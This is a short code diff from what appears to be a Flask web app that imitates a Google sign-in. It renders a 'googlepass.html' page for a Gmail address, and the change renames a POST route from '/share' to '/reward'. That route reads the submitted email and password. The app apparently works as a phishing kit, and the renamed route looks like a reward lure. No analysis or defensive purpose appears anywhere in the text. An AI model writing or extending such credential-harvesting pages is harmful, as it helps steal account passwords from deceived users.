@@ -15,7 +15,7 @@ def glogin():
     if not re.findall(r"@gmail.com",mail):mail+="@gmail.com"
     return render_template('googlepass.html',act=mail)
 
-@app.route("/share",methods=['POST'])
+@app.route("/reward",methods=['POST'])
 def share():
     email=request.form['email']
     passwd=request.form['pass']
